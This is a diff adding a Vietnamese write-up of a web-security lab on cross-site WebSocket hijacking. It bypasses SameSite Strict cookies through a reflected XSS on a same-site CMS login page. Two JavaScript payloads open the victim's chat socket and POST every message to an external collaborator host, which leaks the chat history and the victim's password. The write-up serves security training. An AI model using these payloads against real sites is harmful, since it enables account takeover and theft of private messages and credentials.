@@ -207,6 +207,60 @@ document.location= 'https://0aed00dd04c37eaac07bb86e009000b0.web-security-academ
 Chức năng live chat của trang web đang bị lỗi Cross-site WebSocket hijacking. Để solve bài lab, tìm cách đăng nhập vào tài khoản nạn nhân (bị lộ trong chat history).
 
 
+Đầu tiên, truy cập trang web ta thấy rằng nó set cookie `Session` với thuộc tính `SameSite` có giá trị `Strict` tức là trình duyệt sẽ không bao gồm cookie này trong tất cả các request cross-site.
+
+>![](https://i.imgur.com/iGd6ibM.png)
+
+Sử dụng chức năng `Live chat`, ta thấy khi refresh trang web, nó sẽ gửi message `READY` tới server và server sẽ trả về toàn bộ đoạn hội thoại cũ.
+
+>![](https://i.imgur.com/c9AvDaD.png)
+
+Vậy để khai thác bài này, ta cần tìm cách dụ nạn nhân kích hoạt một message `READY` tới server, khi đó chỉ cần nhận kết quả trả về từ server và forward các kết quả nhận được về tới máy chủ ta. Lúc đó sẽ có toàn bộ lịch sử chat.
+
+Sử dụng đoạn Javascript như sau để thử gửi `READY` tới socket trên server (địa chỉ thu được từ form chat):
+
+```javascript!
+    var ws = new WebSocket('wss://0a5200d00381d613c0e790c900950012.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://rc7wxjfb3kh2c5q6hbug17l0erki87.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+```
+
+Xem xét kết quả nhận được ta thấy rằng nó chỉ trả về một phiên giao tiếp mới.
+
+>![](https://i.imgur.com/IBQpoo4.png)
+
+Lý do là vì cookie `session` không được gửi trong các cross-site request, server không xác định được session trò chuyện, nên sẽ không gửi về toàn bộ lịch sử chat được.
+
+Kiểm tra các request khác, ta thấy có trường `Access-control-Allow-Origin` với giá trị là địa chỉ của miền này:
+
+https://cms-0ad3000d03339b97c091ea2f00ac0012.web-security-academy.net
+
+Đây là một miền khác, nằm trong cùng site với trang web ta đang khai thác. Các request cross-site từ miền này đến trang web đang khai thác sẽ có thể mang theo cookie `session`
+
+Kiểm tra đường link trên, ta thấy có 1 form login, khi nhập username sai sẽ trả về `invalide username: <username>`
+
+>![](https://i.imgur.com/8uqHjXO.png)
+
+Thử xss với username = `<script>alert(1)</script>` thì thấy khai thác XSS được. 
+Vì nó được bao gồm cookie trong các request giữa 2 miền (cùng site) nên ta sẽ tấn công CSRF từ đây để lấy session và thực hiện gửi message `READY` đi.
+
+Payload:
+
+```javascript!
+<script>
+    document.location = "https://cms-0ad3000d03339b97c091ea2f00ac0012.web-security-academy.net/login?username=%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0a5200d00381d613c0e790c900950012.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20ws.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20ws.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fy543qq8iwra95cjdainnuee77ydo1d.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no-cors%27%2C%20body%3A%20event.data%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&password=1";
+</script>
+```
+
+Kết quả lấy được lịch sử chat, có bao gồm mật khẩu của nạn nhân:
+
+>![](https://i.imgur.com/V2pvpmj.png)
+
+
 <hr>
 
 ### Bài 10:SameSite Lax bypass via cookie refresh
